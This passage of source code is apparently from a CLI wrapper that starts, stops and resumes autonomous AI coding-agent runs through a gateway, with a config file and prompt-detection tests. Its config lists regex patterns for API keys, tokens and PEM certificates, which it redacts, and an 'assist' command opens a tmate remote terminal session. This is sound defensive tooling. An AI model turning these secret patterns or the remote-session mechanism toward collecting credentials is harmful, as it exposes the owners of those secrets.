command)';\n        console.log(\n          `${run.id}  ${statusDisplay(run.status).padEnd(12)} ${duration.padEnd(10)} ${command}`\n        );\n      }\n\n      if (result.pagination.hasMore) {\n        console.log(`\\n... use --offset ${result.pagination.offset + result.runs.length} to see more`);\n      }\n    } catch (err: any) {\n      console.error('Failed to list runs:', err.message);\n      process.exit(1);\n    }\n  });\n\nprogram\n  .command('show <runId>')\n  .description('Show details for a specific run')\n  .option('--json', 'Output as JSON')\n  .action(async (runId, options) => {\n    try {\n      const auth = await getUIAuth();\n      const state = await getRunState(auth, runId);\n\n      if (options.json) {\n        console.log(JSON.stringify(state, null, 2));\n        return;\n      }\n\n      const { run, state: runState, recentEvents, canResume } = state;\n\n      console.log('\\n=== Run Details ===\\n');\n      console.log(`ID:          ${run.id}`);\n      console.log(`Status:      ${statusDisplay(run.status)}`);\n      console.log(`Command:     ${run.command || '(no command)'}`);\n      console.log(`Created:     ${formatTime(run.created_at)}`);\n      console.log(`Started:     ${formatTime(run.started_at)}`);\n      console.log(`Finished:    ${formatTime(run.finished_at)}`);\n      console.log(`Duration:    ${formatDuration(run.started_at, run.finished_at)}`);\n      console.log(`Exit Code:   ${run.exit_code ?? '-'}`);\n      console.log(`Can Resume:  ${canResume ? 'Yes' : 'No'}`);\n\n      if (runState) {\n        console.log('\\n=== Saved State ===\\n');\n        console.log(`Working Dir: ${runState.working_dir}`);\n        console.log(`Last Seq:    ${runState.last_sequence}`);\n      }\n\n      if (run.metadata) {\n        console.log('\\n=== Metadata ===\\n');\n        console.log(JSON.stringify(run.metadata, null, 2));\n      }\n\n      if (recentEvents.length > 0) {\n        console.log(`\\n=== Recent Events (last ${recentEvents.length}) ===\\n`);\n        for (const event of recentEvents.slice(-10)) {\n          const time = new Date(event.timestamp * 1000).toLocaleTimeString();\n          const data = event.data.substring(0, 60).replace(/\\n/g, '\\\\n');\n          console.log(`[${time}] ${event.type}: ${data}${event.data.length > 60 ? '...' : ''}`);\n        }\n      }\n    } catch (err: any) {\n      console.error('Failed to get run details:', err.message);\n      process.exit(1);\n    }\n  });\n\n// ============================================================================\n// Run Control Commands\n// ============================================================================\n\nprogram\n  .command('run')\n  .description('Create and start a new autonomous run (no prompt needed)')\n  .option('-c, --cwd <path>', 'Working directory')\n  .option('-p, --prompt <prompt>', 'Initial prompt (optional)')\n  .option('-w, --worker-type <type>', 'Worker type (claude, ollama-launch, codex, gemini, rev)', 'claude')\n  .option('-m, --model <model>', 'Model to use (for Ollama, Gemini, etc.)')\n  .option('-i, --integration <integration>', 'Ollama integration (claude, codex, opencode, droid) - for ollama-launch only')\n  .option('--autonomous', 'Run in fully autonomous mode', true)\n  .option('--no-autonomous', 'Run in interactive mode')\n  .action(async (options) => {\n    try {\n      validateConfig();\n\n      // Validate worker type\n      const workerType = options.workerType;\n      if (!isValidWorkerType(workerType)) {\n        console.error(`Invalid worker type: ${workerType}`);\n        console.error('Valid worker types: claude, ollama-launch, codex, gemini, rev');\n        process.exit(1);\n      }\n\n      const auth = await getUIAuth();\n\n      // Create a new run on the gateway with worker type\n      const createResult = await createRun(auth, {\n        command: options.prompt,\n        workingDir: options.cwd || process.cwd(),\n        autonomous: options.autonomous,\n        workerType,\n        model: options.model\n      });\n\n      console.log(`Created run: ${createResult.id}`);\n      console.log(`Worker: ${getWorkerDisplayName(workerType)}`);\n      if (options.model) {\n        console.log(`Model: ${options.model}`);\n      }\n      console.log(`Mode: ${createResult.autonomous ? 'Autonomous' : 'Interactive'}`);\n", "metadata": {"file": "wrapper/src/cli.ts", "start_line": 201, "end_line": 400, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/cli.ts", "location": "wrapper/src/cli.ts:401", "score": 0.0, "content": "      // Test gateway connection\n      const connected = await testConnection();\n      if (!connected) {\n        console.error(`Cannot connect to gateway at ${config.gatewayUrl}`);\n        process.exit(1);\n      }\n\n      // Create the appropriate runner based on worker type\n      let runner: BaseRunner;\n\n      if (workerType === 'claude') {\n        runner = new ClaudeRunner({\n          runId: createResult.id,\n          capabilityToken: createResult.capabilityToken,\n          workingDir: options.cwd,\n          autonomous: options.autonomous\n        });\n      } else {\n        runner = createGenericRunner(workerType as WorkerType, {\n          runId: createResult.id,\n          capabilityToken: createResult.capabilityToken,\n          workingDir: options.cwd,\n          autonomous: options.autonomous,\n          model: options.model,\n          integration: options.integration\n        });\n      }\n\n      runner.on('stdout', (data) => process.stdout.write(data));\n      runner.on('stderr', (data) => process.stderr.write(data));\n      runner.on('exit', (code) => {\n        console.log(`\\nRun finished with exit code ${code}`);\n        process.exit(code);\n      });\n\n      // Handle graceful shutdown\n      process.on('SIGINT', async () => {\n        console.log('\\nReceived SIGINT, stopping...');\n        await runner.stop();\n      });\n\n      process.on('SIGTERM', async () => {\n        console.log('\\nReceived SIGTERM, stopping...');\n        await runner.stop();\n      });\n\n      await runner.start(options.prompt);\n    } catch (err: any) {\n      console.error(`Failed to start: ${err.message}`);\n      process.exit(1);\n    }\n  });\n\nprogram\n  .command('start')\n  .description('Start a worker run with a specific run ID and token')\n  .requiredOption('--run-id <id>', 'Run ID from gateway')\n  .requiredOption('--token <token>', 'Capability token from gateway')\n  .option('--cmd <command>', 'Worker command/prompt')\n  .option('--cwd <path>', 'Working directory (defaults to current)')\n  .option('-w, --worker-type <type>', 'Worker type (claude, ollama-launch, codex, gemini, rev)', 'claude')\n  .option('-m, --model <model>', 'Model to use (for Ollama, Gemini, etc.)')\n  .option('-i, --integration <integration>', 'Ollama integration (claude, codex, opencode, droid) - for ollama-launch only')\n  .option('--autonomous', 'Run in autonomous mode')\n  .action(async (options) => {\n    try {\n      validateConfig();\n    } catch (err: any) {\n      console.error(`Configuration error: ${err.message}`);\n      console.error('Make sure HMAC_SECRET is set in .env or environment');\n      process.exit(1);\n    }\n\n    // Validate worker type\n    const workerType = options.workerType;\n    if (!isValidWorkerType(workerType)) {\n      console.error(`Invalid worker type: ${workerType}`);\n      console.error('Valid worker types: claude, ollama, codex, gemini, rev');\n      process.exit(1);\n    }\n\n    console.log('Testing gateway connection...');\n    const connected = await testConnection();\n    if (!connected) {\n      console.error(`Cannot connect to gateway at ${config.gatewayUrl}`);\n      console.error('Make sure the gateway is running and GATEWAY_URL is correct');\n      process.exit(1);\n    }\n    console.log('Gateway connection OK');\n    console.log(`Worker: ${getWorkerDisplayName(workerType)}`);\n    if (options.model) {\n      console.log(`Model: ${options.model}`);\n    }\n\n    // Create the appropriate runner based on worker type\n    let runner: BaseRunner;\n\n    if (workerType === 'claude') {\n      runner = new ClaudeRunner({\n        runId: options.runId,\n        capabilityToken: options.token,\n        workingDir: options.cwd,\n        autonomous: options.autonomous\n      });\n    } else {\n      runner = createGenericRunner(workerType as WorkerType, {\n        runId: options.runId,\n        capabilityToken: options.token,\n        workingDir: options.cwd,\n        autonomous: options.autonomous,\n        model: options.model,\n        integration: options.integration\n      });\n    }\n\n    runner.on('stdout', (data) => process.stdout.write(data));\n    runner.on('stderr', (data) => process.stderr.write(data));\n    runner.on('exit', (code) => {\n      console.log(`\\n${getWorkerDisplayName(workerType)} finished with exit code ${code}`);\n      process.exit(code);\n    });\n\n    // Handle graceful shutdown\n    process.on('SIGINT', async () => {\n      console.log('\\nReceived SIGINT, stopping...');\n      await runner.stop();\n    });\n\n    process.on('SIGTERM', async () => {\n      console.log('\\nReceived SIGTERM, stopping...');\n      await runner.stop();\n    });\n\n    try {\n      await runner.start(options.cmd);\n    } catch (err: any) {\n      console.error(`Failed to start: ${err.message}`);\n      process.exit(1);\n    }\n  });\n\nprogram\n  .command('stop <runId>')\n  .description('Gracefully stop a running session (SIGINT, then SIGKILL after 10s)')\n  .action(async (runId) => {\n    try {\n      const auth = await getUIAuth();\n      const result = await stopRun(auth, runId);\n      console.log(`\u2713 Stop requested for run ${runId} (command: ${result.commandId})`);\n      console.log('Process will receive SIGINT, then SIGKILL after 10 seconds if still running.');\n    } catch (err: any) {\n      console.error('Failed to stop run:', err.message);\n      process.exit(1);\n    }\n  });\n\nprogram\n  .command('halt <runId>')\n  .description('Hard halt a running session (immediate SIGKILL)')\n  .action(async (runId) => {\n    try {\n      const auth = await getUIAuth();\n      const result = await haltRun(auth, runId);\n      console.log(`\u2713 Hard halt requested for run ${runId} (command: ${result.commandId})`);\n      console.log('Process will receive immediate SIGKILL.');\n    } catch (err: any) {\n      console.error('Failed to halt run:', err.message);\n      process.exit(1);\n    }\n  });\n\nprogram\n  .command('escape <runId>')\n  .description('Send escape/interrupt sequence to a running session')\n  .action(async (runId) => {\n    try {\n      const auth = await getUIAuth();\n      const result = await sendEscape(auth, runId);\n      console.log(`\u2713 Escape sequence sent to run ${runId} (command: ${result.commandId})`);\n    } catch (err: any) {\n      console.error('Failed to send escape:', err.message);\n      process.exit(1);\n    }\n  });\n\nprogram\n  .command('input <runId> <text>')\n  .description('Send input to stdin of a running session')\n  .option('-e, --escape', 'Prefix with escape sequence (Ctrl+C)')\n  .option('-n, --newline', 'Append newline to input', true)\n  .action(async (runId, text, options) => {\n    try {\n      const auth = await getUIAuth();\n      const input = options.newline ? text + '\\n' : text;\n      const result = await sendInput(auth, runId, input, options.escape);\n      console.log(`\u2713 Input sent to run ${runId} (command: ${result.commandId})`);\n    } catch (err: any) {\n      console.error('Failed to send input:', err.message);\n      process.exit(1);\n    }", "metadata": {"file": "wrapper/src/cli.ts", "start_line": 401, "end_line": 600, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/cli.ts", "location": "wrapper/src/cli.ts:601", "score": 0.0, "content": "  });\n\nprogram\n  .command('restart <runId>')\n  .description('Restart a completed session with same or new configuration')\n  .option('-c, --cmd <command>', 'Override the command/prompt')\n  .option('-d, --cwd <path>', 'Override the working directory')\n  .option('--start', 'Also start the new run immediately')\n  .action(async (runId, options) => {\n    try {\n      const auth = await getUIAuth();\n\n      // Create new run from existing\n      const result = await restartRun(auth, runId, {\n        command: options.cmd,\n        workingDir: options.cwd\n      });\n\n      console.log(`\u2713 Created new run ${result.id} (restarted from ${result.restartedFrom})`);\n      console.log(`Token: ${result.capabilityToken}`);\n\n      if (options.start) {\n        // Start the new run immediately\n        validateConfig();\n\n        const connected = await testConnection();\n        if (!connected) {\n          console.error(`Cannot connect to gateway`);\n          process.exit(1);\n        }\n\n        const runner = new ClaudeRunner({\n          runId: result.id,\n          capabilityToken: result.capabilityToken,\n          workingDir: options.cwd,\n          resumeFrom: runId\n        });\n\n        runner.on('stdout', (data) => process.stdout.write(data));\n        runner.on('stderr', (data) => process.stderr.write(data));\n        runner.on('exit', (code) => {\n          console.log(`\\nRun finished with exit code ${code}`);\n          process.exit(code);\n        });\n\n        process.on('SIGINT', async () => {\n          await runner.stop();\n        });\n\n        await runner.start(options.cmd);\n      } else {\n        console.log('\\nTo start this run:');\n        console.log(`  claude-runner start --run-id ${result.id} --token ${result.capabilityToken}`);\n      }\n    } catch (err: any) {\n      console.error('Failed to restart run:', err.message);\n      process.exit(1);\n    }\n  });\n\nprogram\n  .command('resume <runId>')\n  .alias('continue')\n  .description('Resume a stopped/failed session (creates new run from saved state)')\n  .option('-p, --prompt <prompt>', 'New prompt to continue with')\n  .action(async (runId, options) => {\n    try {\n      const auth = await getUIAuth();\n\n      // Get the run state first\n      const state = await getRunState(auth, runId);\n\n      if (!state.canResume) {\n        console.error(`Run ${runId} cannot be resumed (status: ${state.run.status})`);\n        console.error('Only completed (done/failed) runs can be resumed.');\n        process.exit(1);\n      }\n\n      // Create a new run based on saved state\n      const result = await restartRun(auth, runId, {\n        command: options.prompt\n      });\n\n      console.log(`\u2713 Created resume run ${result.id} (from ${runId})`);\n\n      // Start immediately\n      validateConfig();\n\n      const connected = await testConnection();\n      if (!connected) {\n        console.error(`Cannot connect to gateway`);\n        process.exit(1);\n      }\n\n      const workingDir = state.state?.working_dir || process.cwd();\n\n      const runner = new ClaudeRunner({\n        runId: result.id,\n        capabilityToken: result.capabilityToken,\n        workingDir,\n        resumeFrom: runId\n      });\n\n      runner.on('stdout', (data) => process.stdout.write(data));\n      runner.on('stderr', (data) => process.stderr.write(data));\n      runner.on('exit', (code) => {\n        console.log(`\\nRun finished with exit code ${code}`);\n        process.exit(code);\n      });\n\n      process.on('SIGINT', async () => {\n        await runner.stop();\n      });\n\n      await runner.start(options.prompt);\n    } catch (err: any) {\n      console.error('Failed to resume run:', err.message);\n      process.exit(1);\n    }\n  });\n\n// ============================================================================\n// Utility Commands\n// ============================================================================\n\nprogram\n  .command('assist')\n  .description('Start a tmate assist session and post URL to gateway')\n  .requiredOption('--run-id <id>', 'Run ID from gateway')\n  .requiredOption('--token <token>', 'Capability token from gateway')\n  .option('--cwd <path>', 'Working directory (defaults to current)')\n  .action(async (options) => {\n    try {\n      validateConfig();\n    } catch (err: any) {\n      console.error(`Configuration error: ${err.message}`);\n      process.exit(1);\n    }\n\n    const runner = new ClaudeRunner({\n      runId: options.runId,\n      capabilityToken: options.token,\n      workingDir: options.cwd\n    });\n\n    const url = await runner.startAssistSession();\n    if (url) {\n      console.log('\\n=== Assist Session Ready ===');\n      console.log(`Connect: ${url}`);\n      console.log('Session URL has been sent to the gateway.');\n      console.log('The session will remain active until you close this terminal.');\n    } else {\n      console.error('Failed to start assist session');\n      process.exit(1);\n    }\n\n    // Keep process alive\n    process.on('SIGINT', () => {\n      console.log('\\nAssist session ended');\n      process.exit(0);\n    });\n  });\n\nprogram\n  .command('test-connection')\n  .description('Test connectivity to the gateway')\n  .action(async () => {\n    console.log(`Testing connection to ${config.gatewayUrl}...`);\n    const connected = await testConnection();\n    if (connected) {\n      console.log('\u2713 Connection successful');\n    } else {\n      console.error('\u2717 Connection failed');\n      process.exit(1);\n    }\n  });\n\nprogram\n  .command('info')\n  .description('Show configuration info')\n  .action(() => {\n    console.log('Claude Runner Configuration:');\n    console.log(`  Gateway URL: ${config.gatewayUrl}`);\n    console.log(`  HMAC Secret: ${config.hmacSecret ? '(set)' : '(not set)'}`);\n    console.log(`  Claude Command: ${config.claudeCommand}`);\n    console.log(`  Working Dir: ${config.projectRoot}`);\n    console.log(`  Runs Dir: ${config.runsDir}`);\n    console.log(`  Allow Self-Signed: ${config.allowSelfSignedCerts}`);\n\n    const creds = loadCredentials();\n    if (creds?.sessionToken) {\n      console.log(`\\nLogged in as: ${creds.username} (${creds.role})`);\n    } else {\n      console.log('\\nNot logged in');\n    }\n  });\n\n// ============================================================================\n// Interactive Mode\n// ============================================================================", "metadata": {"file": "wrapper/src/cli.ts", "start_line": 601, "end_line": 800, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/cli.ts", "location": "wrapper/src/cli.ts:801", "score": 0.0, "content": "\nprogram\n  .command('interactive')\n  .alias('i')\n  .description('Start interactive shell for managing runs')\n  .action(async () => {\n    const auth = await getUIAuth();\n    const readline = await import('readline');\n\n    const rl = readline.createInterface({\n      input: process.stdin,\n      output: process.stdout,\n      prompt: 'claude> '\n    });\n\n    console.log('Claude Runner Interactive Mode');\n    console.log('Commands: list, show <id>, run, stop <id>, halt <id>, escape <id>, restart <id>, resume <id>, quit');\n    console.log('');\n\n    rl.prompt();\n\n    rl.on('line', async (line) => {\n      const args = line.trim().split(/\\s+/);\n      const cmd = args[0];\n\n      try {\n        switch (cmd) {\n          case 'list':\n          case 'ls':\n            const runs = await listRuns(auth, { limit: 10 });\n            for (const run of runs.runs) {\n              console.log(`  ${run.id}  ${statusDisplay(run.status).padEnd(12)} ${run.command?.substring(0, 40) || '-'}`);\n            }\n            break;\n\n          case 'show':\n            if (!args[1]) {\n              console.log('Usage: show <runId>');\n            } else {\n              const state = await getRunState(auth, args[1]);\n              console.log(`Status: ${statusDisplay(state.run.status)}`);\n              console.log(`Command: ${state.run.command || '-'}`);\n              console.log(`Duration: ${formatDuration(state.run.started_at, state.run.finished_at)}`);\n            }\n            break;\n\n          case 'stop':\n            if (!args[1]) {\n              console.log('Usage: stop <runId>');\n            } else {\n              await stopRun(auth, args[1]);\n              console.log(`Stop requested for ${args[1]}`);\n            }\n            break;\n\n          case 'halt':\n            if (!args[1]) {\n              console.log('Usage: halt <runId>');\n            } else {\n              await haltRun(auth, args[1]);\n              console.log(`Halt requested for ${args[1]}`);\n            }\n            break;\n\n          case 'escape':\n            if (!args[1]) {\n              console.log('Usage: escape <runId>');\n            } else {\n              await sendEscape(auth, args[1]);\n              console.log(`Escape sent to ${args[1]}`);\n            }\n            break;\n\n          case 'quit':\n          case 'exit':\n          case 'q':\n            rl.close();\n            process.exit(0);\n            break;\n\n          case '':\n            break;\n\n          default:\n            console.log(`Unknown command: ${cmd}`);\n            console.log('Commands: list, show <id>, stop <id>, halt <id>, escape <id>, quit');\n        }\n      } catch (err: any) {\n        console.error(`Error: ${err.message}`);\n      }\n\n      rl.prompt();\n    });\n\n    rl.on('close', () => {\n      process.exit(0);\n    });\n  });\n\nprogram.parse();", "metadata": {"file": "wrapper/src/cli.ts", "start_line": 801, "end_line": 900, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/config.ts", "location": "wrapper/src/config.ts:1", "score": 0.0, "content": "import { config as dotenvConfig } from 'dotenv';\nimport { resolve, dirname } from 'path';\nimport { fileURLToPath } from 'url';\nimport { existsSync } from 'fs';\n\nconst __dirname = dirname(fileURLToPath(import.meta.url));\nconst projectRoot = resolve(__dirname, '..', '..');\n\n// Load .env from project root\nconst envPath = resolve(projectRoot, '.env');\nif (existsSync(envPath)) {\n  dotenvConfig({ path: envPath });\n}\n\nexport const config = {\n  // Gateway connection\n  gatewayUrl: process.env.GATEWAY_URL || 'https://localhost:3100',\n  hmacSecret: process.env.HMAC_SECRET || '',\n\n  // Project paths\n  projectRoot,\n  dataDir: resolve(projectRoot, '.data'),\n  runsDir: resolve(projectRoot, '.data', 'runs'),\n\n  // Worker Commands\n  claudeCommand: process.env.CLAUDE_COMMAND || 'claude',\n  ollamaCommand: process.env.OLLAMA_COMMAND || 'ollama',\n  ollamaModel: process.env.OLLAMA_MODEL || 'codellama:7b',\n  codexCommand: process.env.CODEX_COMMAND || 'codex-cli',\n  geminiCommand: process.env.GEMINI_COMMAND || 'gemini-cli',\n  geminiModel: process.env.GEMINI_MODEL || 'gemini-pro',\n  revCommand: process.env.REV_COMMAND || 'rev',\n\n  // Get worker command by type\n  getWorkerCommand(workerType: string): string {\n    const commands: Record<string, string> = {\n      claude: this.claudeCommand,\n      'ollama-launch': this.ollamaCommand,\n      codex: this.codexCommand,\n      gemini: this.geminiCommand,\n      rev: this.revCommand\n    };\n    return commands[workerType] || workerType;\n  },\n\n  // Get default model for worker type\n  getDefaultModel(workerType: string): string | undefined {\n    const models: Record<string, string | undefined> = {\n      ollama: this.ollamaModel,\n      gemini: this.geminiModel\n    };\n    return models[workerType];\n  },\n\n  // Polling intervals (ms)\n  commandPollInterval: parseInt(process.env.COMMAND_POLL_INTERVAL || '2000', 10),\n  heartbeatInterval: parseInt(process.env.HEARTBEAT_INTERVAL || '30000', 10),\n\n  // Tmate for assist sessions\n  tmateCommand: process.env.TMATE_COMMAND || 'tmate',\n\n  // Security\n  allowSelfSignedCerts: process.env.ALLOW_SELF_SIGNED === 'true',\n\n  // Allowlisted commands (must match gateway config)\n  allowlistedCommands: [\n    // Test commands\n    'npm test',\n    'npm run test',\n    'pnpm test',\n    'pnpm run test',\n    'yarn test',\n    'pytest',\n    'pytest -v',\n    'go test ./...',\n    'cargo test',\n    // Git commands\n    'git diff',\n    'git diff --cached',\n    'git status',\n    'git log --oneline -10',\n    // Directory navigation (handled specially in runner)\n    'cd',\n    'ls',\n    'ls -la',\n    'ls -l',\n    'ls -a',\n    'll',\n    'dir',\n    'pwd'\n  ].concat((process.env.EXTRA_ALLOWED_COMMANDS || '').split(',').filter(Boolean)),\n\n  // Secret patterns to redact before sending\n  secretPatterns: [\n    // Match various key/password/token formats with = or : separators (handles spaces after separator)\n    /(?:api[_-]?key|apiKey|API_KEY|APIKEY|secret|password|PASSWORD|token|TOKEN|auth|AUTH|bearer|Bearer|BEARER|credential)[=:\\s]\\s*[\"']?[\\w\\-\\.]+[\"']?/g,\n    // OpenAI keys\n    /sk-[a-zA-Z0-9]{20,}/g,\n    // GitHub tokens\n    /ghp_[a-zA-Z0-9]{36}/g,\n    /ghs_[a-zA-Z0-9]{36}/g,\n    // NPM tokens\n    /npm_[a-zA-Z0-9]{36}/g,\n    // PEM certificates\n    /-----BEGIN[\\s\\S]*?-----END[^-]*-----/g\n  ]\n};\n\nexport function validateConfig(): void {\n  if (!config.hmacSecret || config.hmacSecret.length < 32) {\n    throw new Error('HMAC_SECRET must be set and at least 32 characters');\n  }\n}", "metadata": {"file": "wrapper/src/config.ts", "start_line": 1, "end_line": 113, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/index.ts", "location": "wrapper/src/index.ts:1", "score": 0.0, "content": "/**\n * Claude Code Wrapper - Module Exports\n *\n * This module can be used programmatically to integrate the wrapper\n * into other tools or scripts.\n */\n\nexport { ClaudeRunner, type RunnerOptions } from './services/claude-runner.js';\nexport {\n  sendEvent,\n  uploadArtifact,\n  pollCommands,\n  ackCommand,\n  testConnection,\n  type RunAuth,\n  type GatewayEvent,\n  type Command\n} from './services/gateway-client.js';\nexport {\n  createSignature,\n  hashBody,\n  generateNonce,\n  redactSecrets,\n  type SignatureComponents\n} from './utils/crypto.js';\nexport { config, validateConfig } from './config.js';", "metadata": {"file": "wrapper/src/index.ts", "start_line": 1, "end_line": 26, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/base-runner.test.ts", "location": "wrapper/src/services/base-runner.test.ts:1", "score": 0.0, "content": "import { describe, it, expect, vi, beforeEach } from 'vitest';\n\n// Mock config\nvi.mock('../config.js', () => ({\n  config: {\n    projectRoot: '/test/project',\n    runsDir: '/test/project/.data/runs',\n    claudeCommand: 'claude',\n    commandPollInterval: 2000,\n    heartbeatInterval: 30000,\n    allowlistedCommands: ['npm test', 'cd', 'ls', 'pwd', 'git diff'],\n    secretPatterns: [/api[_-]?key[=:]\\s*[\"']?[\\w-]+[\"']?/gi]\n  }\n}));\n\n// Mock fs\nvi.mock('fs', () => ({\n  existsSync: vi.fn(),\n  mkdirSync: vi.fn(),\n  writeFileSync: vi.fn(),\n  readFileSync: vi.fn(),\n  createWriteStream: vi.fn(() => ({\n    write: vi.fn(),\n    end: vi.fn()\n  }))\n}));\n\n// Mock child_process\nvi.mock('child_process', () => ({\n  spawn: vi.fn(),\n  execSync: vi.fn()\n}));\n\n// Mock gateway client\nvi.mock('./gateway-client.js', () => ({\n  sendEvent: vi.fn().mockResolvedValue(undefined),\n  uploadArtifact: vi.fn().mockResolvedValue({ artifactId: 'test' }),\n  pollCommands: vi.fn().mockResolvedValue([]),\n  ackCommand: vi.fn().mockResolvedValue(undefined),\n  updateRunState: vi.fn().mockResolvedValue(undefined)\n}));\n\nimport { redactSecrets } from '../utils/crypto.js';\nimport { BaseRunner, type RunnerOptions } from './base-runner.js';\n\n// Test implementation of BaseRunner\nclass TestRunner extends BaseRunner {\n  getWorkerType(): string {\n    return 'test-worker';\n  }\n\n  getCommand(): string {\n    return 'test-cmd';\n  }\n\n  buildCommand(command?: string, autonomous?: boolean): { args: string[]; fullCommand: string } {\n    return {\n      args: command ? [command] : [],\n      fullCommand: command || 'test-cmd'\n    };\n  }\n\n  // Expose protected methods for testing\n  public exposeDetectBlockingPrompt(text: string): boolean {\n    return (this as any).detectBlockingPrompt(text);\n  }\n\n  public exposeBuildStartMarker(command: string): Record<string, any> {\n    return (this as any).buildStartMarker(command);\n  }\n\n  public exposeBuildEnvironment(): NodeJS.ProcessEnv {\n    return (this as any).buildEnvironment();\n  }\n}\n\ndescribe('BaseRunner - Prompt Detection', () => {\n  let runner: TestRunner;\n\n  beforeEach(() => {\n    runner = new TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'test-token',\n      workingDir: '/test/project',\n      autonomous: false\n    });\n  });\n\n  describe('detectBlockingPrompt', () => {\n    it('should detect \"Would you like me to\" prompts', () => {\n      const prompts = [\n        'Would you like me to fix this bug?',\n        'Would you like me to create a new function?',\n        'Would you like me to proceed?'\n      ];\n\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should detect \"Should I\" prompts', () => {\n      const prompts = [\n        'Should I delete this file?',\n        'Should I continue with the refactoring?',\n        'Should I run the tests?'\n      ];\n\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should detect \"Do you want me to\" prompts', () => {\n      const prompts = [\n        'Do you want me to commit these changes?',\n        'Do you want me to run the build?'\n      ];\n\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should detect [Y/n] prompts', () => {\n      const prompts = [\n        'Proceed? [Y/n]',\n        'Continue with this action? [Y/n]',\n        'Are you sure? [Y/n]'\n      ];\n\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should detect (y/N) prompts', () => {\n      const prompts = [\n        'Continue? (y/N)',\n        'Delete file? (y/N)'\n      ];\n\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should detect question mark at end of line', () => {\n      const prompts = [\n        'Are you sure you want to continue?',\n        'Should I proceed with this change?\\n',\n        'Do you want to proceed?'\n      ];\n\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should detect \"Continue?\" prompts', () => {\n      const prompts = [\n        'Continue?',\n        'Press Enter to continue?',\n        'Continue with operation?'\n      ];\n\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should detect \"Press Enter to continue\" prompts', () => {\n      const prompts = [\n        'Press Enter to continue',\n        'Press ENTER to continue',\n        'press enter to continue'\n      ];\n\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should detect \"Type \\'y\\' to continue\" prompts', () => {\n      const prompts = [\n        \"Type 'y' to continue\",\n        \"Type 'y' to proceed\",\n        'Type \"y\" to continue'\n      ];\n\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should detect \"Type \\'yes\\' to continue\" prompts', () => {\n      const prompts = [\n        \"Type 'yes' to continue\",\n        \"Type 'yes' to proceed\"\n      ];", "metadata": {"file": "wrapper/src/services/base-runner.test.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/base-runner.test.ts", "location": "wrapper/src/services/base-runner.test.ts:201", "score": 0.0, "content": "\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should detect \"Enter to proceed\" prompts', () => {\n      const prompts = [\n        'Enter to proceed',\n        'press ENTER to proceed'\n      ];\n\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should detect \"Are you sure\" prompts', () => {\n      const prompts = [\n        'Are you sure?',\n        'Are you sure you want to delete this file?',\n        'Are you certain?'\n      ];\n\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should detect confirmation prompts', () => {\n      const prompts = [\n        'Confirm this change?',\n        'Allow this operation?',\n        'Proceed with this action?',\n        'Would you like to proceed?'\n      ];\n\n      for (const prompt of prompts) {\n        expect(runner.exposeDetectBlockingPrompt(prompt).isPrompt).toBe(true);\n      }\n    });\n\n    it('should NOT detect regular output without prompts', () => {\n      const nonPrompts = [\n        'I am analyzing the code...',\n        'Here are the changes I made:',\n        'Running tests...',\n        'Build succeeded!',\n        'Starting the application...',\n        'Checking dependencies...'\n      ];\n\n      for (const text of nonPrompts) {\n        expect(runner.exposeDetectBlockingPrompt(text).isPrompt).toBe(false);\n      }\n    });\n\n    it('should handle edge cases', () => {\n      expect(runner.exposeDetectBlockingPrompt('').isPrompt).toBe(false);\n      expect(runner.exposeDetectBlockingPrompt('   ').isPrompt).toBe(false);\n      expect(runner.exposeDetectBlockingPrompt('Output without question').isPrompt).toBe(false);\n    });\n  });\n\n  describe('Prompt Detection Integration', () => {\n    it('should detect prompt in Claude-style output', () => {\n      const claudeOutput = `\nI've analyzed the code and found a potential issue in the authentication module.\n\nWould you like me to fix this vulnerability? [Y/n]\n`;\n      expect(runner.exposeDetectBlockingPrompt(claudeOutput).isPrompt).toBe(true);\n    });\n\n    it('should detect prompt in multi-line output', () => {\n      const output = `\nMaking changes to 3 files...\n- src/auth.ts\n- src/user.ts\n- src/session.ts\n\nAre you sure you want to proceed?\n`;\n      expect(runner.exposeDetectBlockingPrompt(output).isPrompt).toBe(true);\n    });\n  });\n});\n\ndescribe('BaseRunner - Start Marker', () => {\n  it('should include workerType in start marker', () => {\n    const runner = new TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'test-token',\n      workingDir: '/test/project',\n      autonomous: false,\n      model: 'test-model'\n    });\n\n    const marker = runner.exposeBuildStartMarker('test command');\n\n    expect(marker.event).toBe('started');\n    expect(marker.workerType).toBe('test-worker');\n    expect(marker.model).toBe('test-model');\n    expect(marker.autonomous).toBe(false);\n  });\n});\n\ndescribe('BaseRunner - Environment Building', () => {\n  it('should set TERM based on autonomous mode', () => {\n    const autonomousRunner = new 